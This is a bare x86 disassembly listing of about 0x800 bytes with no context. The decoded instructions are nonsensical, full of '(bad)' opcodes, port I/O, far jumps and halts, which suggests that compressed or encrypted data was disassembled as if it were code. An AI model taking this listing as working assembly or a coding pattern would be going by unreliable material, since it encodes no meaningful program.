  403129:	loop   0x4031a0
  40312b:	jmp    0xa160:0xe3b34ee9
  403132:	aad    0x99
  403134:	add    al,0xa
  403136:	out    0xe1,al
  403138:	dec    ecx
  403139:	sar    DWORD PTR [ebx+0x5194749c],1
  40313f:	push   ebp
  403140:	hlt    
  403141:	hlt    
  403142:	or     DWORD PTR [eax-0x24],0x388e3960
  403149:	jge    0x4030f7
  40314b:	rcr    BYTE PTR [esi+0x79],0xb1
  40314f:	retf   0xd31c
  403152:	dec    edx
  403153:	and    DWORD PTR [esi+0x7f5dde8b],eax
  403159:	adc    esp,DWORD PTR [esi+0x7267f03d]
  40315f:	in     al,0xd
  403161:	test   al,0x73
  403163:	push   ds
  403164:	test   bh,al
  403166:	mov    ebx,0xc06331f1
  40316b:	add    edx,ebx
  40316d:	lea    ebx,[edx+0x59]
  403170:	cmp    bh,BYTE PTR [ebx+0x498bc778]
  403176:	xor    eax,0xf602fd1e
  40317b:	arpl   WORD PTR ds:0xeb3d10a,bx
  403181:	ret    
  403182:	sbb    ecx,edi
  403184:	adc    ah,BYTE PTR [ebx]
  403186:	jle    0x403206
  403188:	add    BYTE PTR [ebp+0x3b],cl
  40318b:	dec    esi
  40318c:	mov    BYTE PTR [edi+0x39c8203a],cl
  403192:	icebp  
  403193:	(bad)  
  403194:	cmp    BYTE PTR [edi-0x6],al
  403197:	mov    ecx,0x664633b4
  40319c:	dec    ecx
  40319d:	lahf   
  40319e:	and    BYTE PTR [esi+0x1169389b],al
  4031a4:	sbb    al,0xaf
  4031a6:	push   esi
  4031a7:	(bad)  
  4031a8:	cmp    cl,bh
  4031aa:	sbb    bh,BYTE PTR [edx-0x20]
  4031ad:	dec    ecx
  4031ae:	add    ah,dl
  4031b0:	popa   
  4031b1:	sbb    dh,cl
  4031b3:	or     al,0x5c
  4031b5:	xchg   ebx,eax
  4031b6:	push   ebx
  4031b7:	fistp  WORD PTR [ecx]
  4031b9:	stos   DWORD PTR es:[edi],eax
  4031ba:	repnz mov dl,0xd3
  4031bd:	lods   al,BYTE PTR ds:[esi]
  4031be:	int    0xca
  4031c0:	lods   eax,DWORD PTR ds:[esi]
  4031c1:	les    esp,FWORD PTR [edx-0xd]
  4031c4:	cmp    eax,DWORD PTR [edi+0x1d0ad34a]
  4031ca:	scas   al,BYTE PTR es:[edi]
  4031cb:	pushf  
  4031cc:	push   eax
  4031cd:	loope  0x403189
  4031cf:	in     al,0x1c
  4031d1:	iret   
  4031d2:	mov    ?,WORD PTR [eax-0x4c72d151]
  4031d8:	ficomp WORD PTR [esi]
  4031da:	jecxz  0x4031ca
  4031dc:	cmp    eax,0x3a6abfc0
  4031e1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4031e2:	test   BYTE PTR [ebp+edi*1-0x25a25bee],al
  4031e9:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  4031eb:	shl    DWORD PTR [ebx-0x75],cl
  4031ee:	inc    ecx
  4031ef:	xchg   edi,eax
  4031f0:	out    dx,eax
  4031f1:	int3   
  4031f2:	push   ds
  4031f3:	pop    esi
  4031f4:	pop    eax
  4031f5:	shr    DWORD PTR [edi],0xaa
  4031f8:	and    ecx,eax
  4031fa:	(bad)  
  4031fc:	ins    BYTE PTR es:[edi],dx
  4031fd:	push   esi
  4031fe:	mov    ch,0xdd
  403200:	jle    0x4031b8
  403202:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403203:	(bad)
  403207:	fcmovbe st,st(1)
  403209:	push   eax
  40320a:	mov    ds:0xeb9fab0d,eax
  40320f:	cmp    dh,BYTE PTR [esi-0xc]
  403212:	cmp    al,0xbe
  403214:	pop    edx
  403215:	cdq    
  403216:	popf   
  403217:	retf   0x83f0
  40321a:	xchg   ebp,eax
  40321b:	sub    bh,BYTE PTR [ebx-0x1cfca6d8]
  403221:	dec    edi
  403222:	icebp  
  403223:	not    BYTE PTR [esi+0x399eadeb]
  403229:	or     eax,0x40cfe54f
  40322e:	adc    eax,0x1a2f43ad
  403233:	(bad)  
  403234:	dec    eax
  403235:	dec    ebp
  403236:	mov    al,ds:0x66c3aae7
  40323b:	je     0x4032ad
  40323d:	mov    ds:0x8d701b18,eax
  403242:	dec    edi
  403243:	fisttp DWORD PTR [eax-0x3a]
  403246:	add    BYTE PTR [ecx],bh
  403248:	(bad)  
  40324a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40324b:	pushf  
  40324c:	add    bh,BYTE PTR [ebx-0x624a0d87]
  403252:	add    eax,0x9270b10b
  403257:	je     0x40329f
  403259:	nop
  40325a:	add    eax,DWORD PTR [ebp-0xb249e5f]
  403260:	sar    WORD PTR [edx],1
  403263:	loope  0x4031eb
  403265:	rol    BYTE PTR [ebp+0x58],cl
  403268:	imul   esi,DWORD PTR [eax+0x6d3c5695],0x7d3e9e7f
  403272:	bound  edx,QWORD PTR [edx-0x79b9bd7c]
  403278:	xor    DWORD PTR [esi+0x7d1e01a4],0xd8001ded
  403282:	sub    BYTE PTR [edx+0x36],bl
  403285:	cdq    
  403286:	rcr    DWORD PTR [edi],0xf5
  403289:	jmp    0xfb9e0c14
  40328e:	jb     0x403275
  403290:	sbb    ah,bh
  403292:	mov    bh,0xbe
  403294:	cmp    al,0xb6
  403296:	aaa    
  403297:	or     edi,DWORD PTR [edx]
  403299:	mov    esp,0xedc07441
  40329e:	and    al,0x9a
  4032a0:	pop    edx
  4032a1:	dec    ebx
  4032a2:	out    dx,eax
  4032a3:	ss mov al,0x13
  4032a6:	mov    es:0xe63c8d6e,eax
  4032ac:	and    eax,0x59d5d891
  4032b1:	xor    BYTE PTR [ecx],dl
  4032b3:	test   al,0x5a
  4032b5:	sbb    ebx,ebx
  4032b7:	(bad)  
  4032b8:	ins    DWORD PTR es:[edi],dx
  4032b9:	inc    edx
  4032ba:	mov    eax,0x34dcb437
  4032bf:	rcr    BYTE PTR [ebx-0x50],0x1a
  4032c3:	push   ds
  4032c4:	mov    eax,eax
  4032c6:	daa    
  4032c7:	sti    
  4032c8:	pushf  
  4032c9:	stos   BYTE PTR es:[edi],al
  4032ca:	adc    al,0x75
  4032cc:	adc    DWORD PTR ds:0xb3d579a6,0xa2a70e84
  4032d6:	mov    ecx,0x2dbada12
  4032db:	iret   
  4032dc:	mov    al,0xe
  4032de:	dec    DWORD PTR [ecx-0x8]
  4032e1:	retf   0xa378
  4032e4:	inc    edi
  4032e5:	shl    DWORD PTR [ebp+0x26c21914],1
  4032eb:	and    al,0x8d
  4032ed:	xor    edi,eax
  4032ef:	xor    BYTE PTR [eax+0x5b],dl
  4032f2:	mov    ?,WORD PTR [ebp-0x5]
  4032f5:	sbb    al,0xf6
  4032f7:	jmp    FWORD PTR [esi-0x16]
  4032fa:	rol    DWORD PTR [edx],cl
  4032fc:	xor    BYTE PTR [edx-0x7250359],cl
  403302:	xor    DWORD PTR [eax],eax
  403304:	sub    ch,BYTE PTR [esi*8+0x1b2fa43]
  40330b:	push   ds
  40330c:	pop    ecx
  40330d:	add    BYTE PTR [edi-0xe],al
  403310:	inc    ebp
  403311:	sub    eax,0x50e94046
  403316:	push   eax
  403317:	or     bl,al
  403319:	push   0x8f3242b9
  40331e:	sub    al,0x53
  403320:	xor    DWORD PTR [esi],ebx
  403322:	ja     0x40337e
  403324:	in     eax,0x69
  403326:	aaa    
  403327:	xchg   edx,eax
  403328:	shl    BYTE PTR ds:0xa24ae8b,1
  40332e:	mov    al,0x52
  403330:	test   eax,0x520d6a14
  403335:	inc    esi
  403336:	adc    DWORD PTR [ecx+esi*2-0x77c547eb],esp
  40333d:	push   eax
  40333e:	jne    0x403353
  403340:	stc    
  403341:	iret   
  403342:	push   ecx
  403343:	adc    DWORD PTR [esi],edx
  403345:	test   BYTE PTR [eax+0x6e],0x1d
  403349:	jecxz  0x4033ad
  40334b:	(bad)  
  40334c:	xchg   ecx,eax
  40334d:	mov    ecx,0x68a6950f
  403352:	enter  0x620b,0x79
  403356:	mov    eax,0xc452e912
  40335b:	pusha  
  40335c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40335d:	std    
  40335e:	int3   
  40335f:	inc    edi
  403360:	lahf   
  403361:	fidiv  WORD PTR [edi+0x7d4f38fb]
  403367:	mov    BYTE PTR es:[eax+edx*8-0x7b],bh
  40336c:	push   cs
  40336d:	and    eax,0xe6b3e0fc
  403372:	pop    esp
  403373:	(bad)  
  403374:	push   edx
  403375:	lahf   
  403376:	call   FWORD PTR [esi-0x5d]
  403379:	and    edx,DWORD PTR [esi-0x30]
  40337c:	loopne 0x40338d
  40337e:	xchg   DWORD PTR [edi-0x6b334adb],edi
  403384:	jmp    0x4033bb
  403386:	sub    edx,esi
  403388:	jbe    0x40335c
  40338a:	xor    DWORD PTR [esp+edi*8+0x105cab59],edi
  403391:	cdq    
  403392:	mov    edi,0x2f0c24f0
  403397:	push   0xa384c01f
  40339c:	jle    0x403370
  40339e:	aad    0x25
  4033a0:	adc    ebx,DWORD PTR [eax-0x2b]
  4033a3:	adc    eax,0x9b622801
  4033a8:	scas   eax,DWORD PTR es:[edi]
  4033a9:	adc    al,BYTE PTR [esi+ecx*4]
  4033ac:	idiv   BYTE PTR ds:0xe67aa1b7
  4033b2:	int3   
  4033b3:	scas   eax,DWORD PTR es:[edi]
  4033b4:	loop   0x403387
  4033b6:	sbb    al,0x3d
  4033b8:	adc    cl,BYTE PTR [edi+0x32]
  4033bb:	je     0x403341
  4033bd:	or     eax,0xf81a2d86
  4033c2:	pop    eax
  4033c3:	mov    eax,ds:0xfe01cecb
  4033c8:	add    edx,DWORD PTR [esi]
  4033ca:	cli    
  4033cb:	mov    bh,0x85
  4033cd:	cli    
  4033ce:	daa    
  4033cf:	(bad)  
  4033d0:	jecxz  0x403384
  4033d2:	pushf  
  4033d3:	pusha  
  4033d4:	out    dx,eax
  4033d5:	push   esp
  4033d6:	call   0xc1c5e5d1
  4033db:	ret    
  4033dc:	in     eax,dx
  4033dd:	jle    0x4033b8
  4033df:	xchg   esp,eax
  4033e0:	ins    WORD PTR es:[edi],dx
  4033e2:	jns    0x40339d
  4033e4:	test   eax,0xcb0ed639
  4033e9:	mov    bh,0xb1
  4033eb:	pop    ebp
  4033ec:	icebp  
  4033ed:	lds    edi,FWORD PTR [eax-0x71b03155]
  4033f3:	pop    ss
  4033f4:	mov    bh,0x80
  4033f6:	add    DWORD PTR [edi-0x34],eax
  4033f9:	fstp   DWORD PTR [eax+0x38]
  4033fc:	shl    BYTE PTR [esi+0x24beaab3],0x4a
  403403:	add    BYTE PTR [ecx-0x4a],0xff
  403407:	stos   DWORD PTR es:[edi],eax
  403408:	fisttp DWORD PTR [eax]
  40340a:	lahf   
  40340b:	pushf  
  40340c:	jnp    0x4033ee
  40340e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40340f:	pop    ecx
  403410:	push   ebp
  403411:	cmp    eax,0x75150dc7
  403416:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403417:	lods   eax,DWORD PTR ds:[esi]
  403418:	pop    edi
  403419:	cmp    cl,BYTE PTR [ebx-0x6bb4692b]
  40341f:	in     eax,0xa6
  403421:	jno    0x40345b
  403423:	adc    BYTE PTR [esp+esi*1-0x34],0x6a
  403428:	push   esi
  403429:	fwait
  40342a:	cmp    DWORD PTR [ebx-0x4a0aeb5b],ebp
  403430:	fidivr DWORD PTR [eax-0x13d4723d]
  403436:	mov    ebp,0x819b1c48
  40343b:	mov    esi,DWORD PTR [edx+0x17]
  40343e:	push   ebp
  40343f:	lea    edi,[ebx+0x6d]
  403442:	rcl    eax,cl
  403444:	sub    al,0x65
  403446:	nop
  403447:	sbb    BYTE PTR [edi],0x92
  40344a:	sbb    al,BYTE PTR [eax]
  40344c:	fsubr  DWORD PTR [ebp-0xb242f3d]
  403452:	adc    dl,BYTE PTR [ebx-0x33ba6896]
  403458:	in     al,0x74
  40345a:	cmp    BYTE PTR [ebp+0x23],al
  40345d:	aad    0x6f
  40345f:	or     eax,0xa82228e5
  403464:	sti    
  403465:	lea    ecx,[esi-0x4a71ecfe]
  40346b:	inc    edx
  40346c:	out    0x8c,eax
  40346e:	pusha  
  40346f:	aad    0x2f
  403471:	xchg   ebx,eax
  403472:	sbb    eax,0x3537dcc4
  403477:	mov    bl,0x5a
  403479:	inc    esp
  40347a:	adc    al,0x69
  40347c:	es dec ecx
  40347e:	xchg   edi,eax
  40347f:	mov    edi,0x9e726177
  403484:	fmul   st,st(7)
  403486:	pop    ds
  403487:	inc    ecx
  403488:	test   BYTE PTR [esi+0x1a],cl
  40348b:	cmc    
  40348c:	mov    ah,0xfa
  40348e:	push   eax
  40348f:	test   al,0x52
  403491:	jl     0x4034f1
  403493:	push   ds
  403494:	js     0x40349d
  403496:	mov    bh,0xff
  403498:	dec    esi
  403499:	mov    ecx,esp
  40349b:	pushf  
  40349c:	data16 mov al,0x9b
  40349f:	sti    
  4034a0:	push   esi
  4034a1:	jle    0x403519
  4034a3:	or     al,0x57
  4034a5:	test   DWORD PTR [ebx],edi
  4034a7:	push   edi
  4034a8:	adc    eax,0xd34f97e4
  4034ad:	mov    al,ds:0x1734507
  4034b2:	in     al,dx
  4034b3:	push   esi
  4034b4:	or     BYTE PTR [eax+0x58],0xee
  4034b8:	rcr    BYTE PTR [esi+0x5],1
  4034bb:	or     dl,0xbb
  4034be:	jae    0x403459
  4034c0:	inc    ebx
  4034c1:	rcl    DWORD PTR [eax+0x60],1
  4034c4:	std    
  4034c5:	pop    ebx
  4034c6:	inc    eax
  4034c7:	mov    al,0xc6
  4034c9:	imul   ebx,DWORD PTR fs:[edx-0x6c0acc08],0x85f53c0e
  4034d4:	inc    esp
  4034d5:	sbb    BYTE PTR [edi+esi*8],bl
  4034d8:	mov    ecx,0x1f596e4d
  4034dd:	jns    0x40353f
  4034df:	dec    eax
  4034e0:	cmp    al,dh
  4034e2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4034e3:	bound  ecx,QWORD PTR [ecx+0x61f76f94]
  4034e9:	dec    ecx
  4034ea:	adc    DWORD PTR [esi],edi
  4034ec:	add    eax,0x3e4d4ebe
  4034f1:	in     al,dx
  4034f2:	jb     0x403551
  4034f4:	pop    esi
  4034f5:	pop    ebx
  4034f6:	xor    eax,0x6df95768
  4034fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4034fc:	adc    al,0xb0
  4034fe:	out    dx,eax
  4034ff:	out    0x6e,al
  403501:	test   BYTE PTR [ecx+0x3a13c7e6],dh
  403507:	inc    ebx
  403508:	add    edx,DWORD PTR ds:0x6141fc3c
  40350e:	add    edi,0xffffffc3
  403511:	mov    al,ds:0xbeb2b3fb
  403516:	mov    ds:0xfdf6ebe9,eax
  40351b:	fmul   DWORD PTR [ebx+0x1a274cdc]
  403521:	add    al,0xc1
  403523:	ins    DWORD PTR es:[edi],dx
  403524:	out    0x84,eax
  403526:	xchg   esi,eax
  403527:	dec    ecx
  403528:	inc    esi
  403529:	inc    edi
  40352a:	inc    esi
  40352b:	push   esp
  40352c:	cli    
  40352d:	fidivr WORD PTR [edi+0x4d]
  403530:	push   0x51
  403532:	clc    
  403533:	sub    DWORD PTR [esi+eiz*8+0x61],esp
  403537:	and    ebp,eax
  403539:	pop    eax
  40353a:	sub    esp,DWORD PTR [edx-0x380990b4]
  403540:	aas    
  403541:	push   es
  403542:	jnp    0x40354b
  403544:	xchg   edi,eax
  403545:	push   edi
  403546:	inc    eax
  403547:	mov    esp,ebx
  403549:	mov    cl,0x5d
  40354b:	popa   
  40354c:	pop    ecx
  40354d:	push   esp
  40354e:	xchg   ebx,eax
  40354f:	push   ebp
  403550:	lods   eax,DWORD PTR ds:[esi]
  403551:	pop    edi
  403552:	dec    edi
  403553:	pop    es
  403554:	hlt    
  403555:	or     al,0x3f
  403557:	xor    al,0x79
  403559:	jmp    0xf94a:0x3e7820f0
  403560:	push   edi
  403561:	fwait
  403562:	sub    eax,0x8ad64fc5
  403567:	mov    esi,0xdee66b0
  40356c:	ror    esi,cl
  40356e:	test   DWORD PTR [edi],edx
  403570:	xchg   ebx,eax
  403571:	xor    eax,0xabb7bf0b
  403576:	retf   
  403577:	jnp    0x403563
  403579:	mov    ah,0xb6
  40357b:	or     DWORD PTR [ecx],eax
  40357d:	xchg   ebx,eax
  40357e:	push   esp
  40357f:	cmp    DWORD PTR [ebp-0x4e],eax
  403582:	jle    0x403507
  403584:	jae    0x40356d
  403586:	add    ah,BYTE PTR [ecx+edx*1]
  403589:	repnz sub al,0xb4
  40358c:	push   ds
  40358d:	push   edx
  40358e:	cmp    DWORD PTR [ebx-0x3af8f015],ebp
  403594:	fsubrp st(2),st
  403596:	pop    esi
  403597:	push   DWORD PTR [esi-0x52]
  40359a:	int    0x6b
  40359c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40359d:	inc    ebx
  40359e:	(bad)
  4035a2:	mov    ?,WORD PTR [edx-0x51fadc8f]
  4035a8:	in     al,0x79
  4035aa:	js     0x4035e4
  4035ac:	cmc    
  4035ad:	cwde   
  4035ae:	aam    0x5
  4035b0:	jne    0x4035e9
  4035b2:	retf   
  4035b3:	mov    ds:0xc1166378,al
  4035b8:	fs sub eax,0x77ad64e3
  4035be:	fiadd  DWORD PTR [ebx]
  4035c0:	sbb    bl,ch
  4035c2:	rep ins DWORD PTR es:[edi],dx
  4035c4:	dec    ecx
  4035c5:	mov    esi,0x474042c6
  4035ca:	adc    dh,al
  4035cc:	xor    DWORD PTR [eax+0x73],edx
  4035cf:	mov    eax,ds:0xc72ebeda
  4035d4:	test   DWORD PTR [edx+0x23],0x10257995
  4035db:	jle    0x403623
  4035dd:	clc    
  4035de:	add    BYTE PTR [ecx-0x2c],al
  4035e1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4035e2:	fadd   st(1),st
  4035e4:	in     eax,dx
  4035e5:	inc    esi
  4035e6:	pop    ebx
  4035e7:	or     BYTE PTR [esi],ch
  4035e9:	add    BYTE PTR [esi],ch
  4035eb:	ror    BYTE PTR [esi+0x49d6d0a3],0x29
  4035f2:	ror    DWORD PTR [ebx+0x46066112],cl
  4035f8:	adc    ebx,DWORD PTR [ecx+edx*4-0x4e06d447]
  4035ff:	jmp    0x4035f0
  403601:	push   cs
  403602:	stos   BYTE PTR es:[edi],al
  403603:	pop    eax
  403604:	mov    esi,0x73926f24
  403609:	repnz push es
  40360b:	push   cs
  40360c:	xchg   edi,eax
  40360d:	pusha  
  40360e:	dec    edx
  40360f:	adc    al,0x9d
  403611:	xchg   BYTE PTR [edx],dl
  403613:	inc    ecx
  403614:	adc    BYTE PTR [esi],0x99
  403617:	jmp    0x403670
  403619:	outs   dx,BYTE PTR ds:[esi]
  40361a:	jb     0x4035d6
  40361c:	(bad)  
  40361e:	jo     0x40367a
  403620:	jmp    0x7710ebb9
  403625:	xchg   ebp,eax
  403626:	jno    0x4035ec
  403628:	xchg   edi,eax
  403629:	or     BYTE PTR [edi+0x2a9aeb76],dh
  40362f:	lods   eax,DWORD PTR ds:[esi]
  403630:	push   edx
  403631:	push   ebx
  403632:	dec    edx
  403633:	and    BYTE PTR [ecx],bl
  403635:	adc    edi,edx
  403637:	push   es
  403638:	test   DWORD PTR [ecx],0x1f0e4f2b
  40363e:	into   
  40363f:	stos   BYTE PTR es:[edi],al
  403640:	ficom  DWORD PTR [esi+0x6acc1795]
  403646:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403647:	pop    ebx
  403648:	ins    BYTE PTR es:[edi],dx
  403649:	(bad)  
  40364a:	imul   edi,DWORD PTR [ebx+0x2970beae],0xffffffb2
  403651:	xchg   esi,eax
  403652:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403653:	adc    BYTE PTR [esi+0xf],cl
  403656:	cmp    al,0xcb
  403658:	out    0xca,eax
  40365a:	ds push esi
  40365c:	lods   eax,DWORD PTR ds:[esi]
  40365d:	lock jl 0x4035e4
  403660:	daa    
  403661:	mov    ds:0x6f1302d0,al
  403666:	inc    ecx
  403667:	aaa    
  403668:	pusha  
  403669:	nop
  40366a:	push   ebx
  40366b:	cld    
  40366c:	icebp  
  40366d:	sub    bh,BYTE PTR [ecx]
  40366f:	pop    esp
  403670:	in     al,0x50
  403672:	jl     0x4036dd
  403674:	fsubrp st(7),st
  403676:	jo     0x403649
  403678:	pop    edi
  403679:	push   0x5b
  40367b:	leave  
  40367c:	jb     0x403637
  40367e:	or     bl,BYTE PTR [ecx-0x365abeae]
  403684:	(bad)  [ecx+0x5d8006a7]
  40368a:	sub    BYTE PTR [edx],cl
  40368c:	add    al,0x23
  40368e:	lds    edx,FWORD PTR fs:[eax]
  403691:	mov    edi,0x63ee5143
  403696:	aam    0xdd
  403698:	jno    0x40365d
  40369a:	aas    
  40369b:	jp     0x4036f0
  40369d:	in     al,dx
  40369e:	add    eax,0xd51c4d1a
  4036a3:	nop
  4036a4:	dec    edx
  4036a5:	imul   BYTE PTR [edx]
  4036a7:	cmc    
  4036a8:	sbb    edi,DWORD PTR [edi]
  4036aa:	mov    ecx,0x269b9b12
  4036af:	popa   
  4036b0:	dec    eax
  4036b1:	loop   0x4036c5
  4036b3:	mov    bh,0xad
  4036b5:	outs   dx,DWORD PTR ds:[esi]
  4036b6:	cld    
  4036b7:	jb     0x403687
  4036b9:	pop    edi
  4036ba:	pop    ds
  4036bb:	push   ss
  4036bc:	retf   0x85af
  4036bf:	xor    eax,0x939aa9de
  4036c4:	push   ebp
  4036c5:	pushf  
  4036c6:	sar    dh,1
  4036c8:	push   eax
  4036c9:	pop    esi
  4036ca:	sbb    al,0xe4
  4036cc:	mov    ds:0x5649cd6f,eax
  4036d1:	icebp  
  4036d2:	inc    eax
  4036d3:	data16 mov ch,BYTE PTR fs:[edi]
  4036d7:	arpl   sp,bp
  4036d9:	jae    0x403741
  4036db:	sbb    eax,DWORD PTR [edi+0x6e]
  4036de:	push   esp
  4036df:	mov    es,WORD PTR [ebp-0x44]
  4036e2:	mov    ds:0xc67fac90,eax
  4036e7:	jnp    0x403713
  4036e9:	outs   dx,BYTE PTR ds:[esi]
  4036ea:	adc    bl,BYTE PTR [edi+0x1]
  4036ed:	sbb    al,0x24
  4036ef:	push   es
  4036f0:	shl    BYTE PTR [ebx-0x57],0xce
  4036f4:	dec    ecx
  4036f5:	jns    0x403712
  4036f7:	sbb    al,0x42
  4036f9:	or     eax,0x4023b4a6
  4036fe:	retf   0x1f0c
  403701:	mov    ds:0x8ff0c47c,eax
  403706:	add    eax,0x51778b06
  40370b:	not    cl
  40370d:	xor    ebp,ebx
  40370f:	push   ebx
  403710:	ss dec ecx
  403712:	(bad)  
  403713:	scas   eax,DWORD PTR es:[edi]
  403714:	and    eax,0xd9def73e
  403719:	dec    esp
  40371a:	ror    DWORD PTR [ebx],cl
  40371c:	pop    ebx
  40371d:	mov    esp,0xdd67ce45
  403722:	(bad)  
  403723:	aas    
  403724:	push   ds
  403725:	into   
  403726:	xchg   edi,eax
  403727:	inc    eax
  403728:	push   es
  403729:	std    
  40372a:	xor    eax,0x44b32401
  40372f:	fwait
  403730:	dec    ecx
  403731:	adc    edi,DWORD PTR ds:[edx+0x2e174fd1]
  403738:	pop    edi
  403739:	leave  
  40373a:	out    dx,al
  40373b:	loope  0x4037a9
  40373d:	pop    edi
  40373e:	mov    ch,0x8
  403740:	icebp  
  403741:	jecxz  0x403770
  403743:	add    eax,0xfa3bea6c
  403748:	jmp    0xd401:0xbfb9bdf4
  40374f:	fidiv  WORD PTR [ebx+0x6]
  403752:	retf   
  403753:	mov    eax,0x4090cb59
  403758:	repnz cli 
  40375a:	mov    dl,0x37
  40375c:	inc    ebx
  40375d:	pop    esi
  40375e:	xor    esp,ecx
  403760:	mov    ebx,0xe7e06c9e
  403765:	repnz hlt 
  403767:	out    0x8f,eax
  403769:	push   esi
  40376a:	sub    esi,DWORD PTR [edx+0x6a8825c9]
  403770:	clc    
  403771:	inc    edi
  403772:	lock mov ds,WORD PTR [edi+0x15e1add7]
  403779:	cmp    al,0x92
  40377b:	popf   
  40377c:	mov    eax,ds:0xdc566ee
  403781:	push   cs
  403782:	fimul  WORD PTR [esi+0x28c39979]
  403788:	arpl   WORD PTR [ecx+0xf058b63],cx
  40378e:	shl    ebp,0xe2
  403791:	mov    edx,0x1c11067a
  403796:	aaa    
  403797:	rcr    BYTE PTR [ebx-0x23],1
  40379a:	loope  0x40377f
  40379c:	faddp  st(6),st
  40379e:	ins    DWORD PTR es:[edi],dx
  40379f:	cmp    al,0x66
  4037a1:	or     eax,0xf4ab9d31
  4037a6:	sub    eax,0x715263cd
  4037ab:	or     DWORD PTR ds:0xde9535e0,ecx
  4037b1:	add    BYTE PTR ss:[eax-0x19],ch
  4037b5:	pop    es
  4037b6:	mov    esi,0x4770a9bc
  4037bb:	and    eax,0x6ae8d25f
  4037c0:	cli    
  4037c1:	imul   edi,DWORD PTR [eax],0xffffffec
  4037c4:	pop    esi
  4037c5:	or     BYTE PTR [esi],dl
  4037c7:	xor    al,0xef
  4037c9:	iret   
  4037ca:	xchg   esp,eax
  4037cb:	out    0x5c,eax
  4037cd:	cmp    ebp,ebx
  4037cf:	enter  0x5265,0x1e
  4037d3:	stos   BYTE PTR es:[edi],al
  4037d4:	mov    ds:0x6278f96d,al
  4037d9:	add    DWORD PTR [esi-0x2fb8e9d1],edx
  4037df:	jne    0x4037db
  4037e1:	retf   0x9fd4
  4037e4:	popf   
  4037e5:	adc    al,dh
  4037e7:	stos   BYTE PTR es:[edi],al
  4037e8:	dec    ebx
  4037e9:	mov    bl,0xff
  4037eb:	mov    al,0x8c
  4037ed:	cmp    al,0xf4
  4037ef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4037f0:	fiadd  WORD PTR [edx+0x61c12bbe]
  4037f6:	and    edi,DWORD PTR ds:0x3e830ec9
  4037fc:	and    eax,0xb23165a4
  403801:	cwde   
  403802:	push   ss
  403803:	loope  0x4037c4
  403805:	xchg   edi,eax
  403806:	(bad)  [esi]
  403808:	cmp    al,0x8a
  40380a:	xchg   ebp,eax
  40380b:	repnz (bad) 
  40380d:	or     DWORD PTR [edi+0xc8485e6],ebp
  403813:	loop   0x403803
  403815:	aas    
  403816:	out    dx,eax
  403817:	mov    ebx,0x3a550159
  40381c:	and    al,0x20
  40381e:	sbb    eax,0xa1a5a15c
  403823:	push   esi
  403824:	jno    0x40382e
  403826:	mov    eax,ds:0x326627ed
  40382b:	aaa    
  40382c:	or     edi,DWORD PTR [edi+0x4c]
  40382f:	add    al,0xc0
  403831:	mov    ebp,0x64ce48c9
  403836:	fs dec eax
  403838:	ret    0xe31b
  40383b:	ins    WORD PTR es:[edi],dx
  40383d:	and    al,0x69
  40383f:	jl     0x40386e
  403841:	jle    0x403885
  403843:	mov    BYTE PTR [ebx],bl
  403845:	icebp  
  403846:	cs add eax,0x68c9df0
  40384c:	dec    ebx
  40384d:	xor    al,0x6a
  40384f:	in     al,dx
  403850:	add    BYTE PTR [ecx],bl
  403852:	xor    dh,ah
  403854:	push   esi
  403855:	popf   
  403856:	add    esp,DWORD PTR [ebx+0x7e]
  403859:	mov    dh,0x14
  40385b:	es ret 
  40385d:	cmp    eax,0x388e5d1e
  403862:	sbb    edx,DWORD PTR [eax]
  403864:	pop    esp
  403865:	cmp    al,0xde
  403867:	cwde   
  403868:	inc    edi
  403869:	dec    ebp
  40386a:	lahf   
  40386b:	sbb    DWORD PTR [ebp-0x1b],eax
  40386e:	sub    BYTE PTR [eax+ebp*2+0x9558eb3],al
  403875:	(bad)  [edi-0x265af3e6]
  40387b:	xor    eax,0x32ca291a
  403880:	mov    eax,ds:0x44b27d2
  403885:	cli    
  403886:	xlat   BYTE PTR ds:[ebx]
  403887:	xchg   esp,eax
  403888:	(bad)  
  403889:	dec    BYTE PTR [edx]
  40388b:	cld    
  40388c:	rol    BYTE PTR [ecx+0x2d],1
  40388f:	mov    esi,0x15bcc22a
  403894:	adc    BYTE PTR [esi+edx*1],ch
  403897:	arpl   WORD PTR [edx+0xb8aa634],bp
  40389d:	and    BYTE PTR ds:0x79a83ac8,ch
  4038a3:	and    al,0x63
  4038a5:	ins    BYTE PTR es:[edi],dx
  4038a6:	cli    
  4038a7:	aad    0x2
  4038a9:	sub    BYTE PTR [ebx-0x40ad7378],0xa
  4038b0:	jg     0x4038a7
  4038b2:	mov    al,ds:0x1bfdf72f
  4038b7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4038b8:	pop    esi
  4038b9:	sub    dl,BYTE PTR [edi]
  4038bb:	hlt    
  4038bc:	outs   dx,BYTE PTR ds:[esi]
  4038bd:	fist   DWORD PTR [esi-0x1b]
  4038c0:	retf   
  4038c1:	daa    
  4038c2:	inc    edx
  4038c3:	xor    BYTE PTR [edx+eax*2-0xd773b76],dl
  4038ca:	push   cs
  4038cb:	add    al,0x45
  4038cd:	add    eax,0x179e0d3d
  4038d2:	pop    eax
  4038d3:	add    esp,DWORD PTR [edx-0x2684b173]
  4038d9:	pop    ebp
  4038da:	gs mov bh,0x81
  4038dd:	test   DWORD PTR [edx+0x57ce5d69],esp
  4038e3:	adc    al,0xf7
  4038e5:	adc    edi,esp
  4038e7:	and    al,0x5a
  4038e9:	push   esp
  4038ea:	inc    ebp
  4038eb:	push   0xdd3cd1
  4038f0:	out    dx,eax
  4038f1:	frstor [ebx-0x25a76e7]
  4038f7:	sar    DWORD PTR [edi+0x537d81b0],1
  4038fd:	imul   eax,DWORD PTR [eax+0x39f53d55],0x81f04d8b
  403907:	sub    eax,0x426eb9
  40390c:	mov    eax,ds:0x3300426e
  403911:	mov    BYTE PTR [ecx+0x426f2d15],0x0
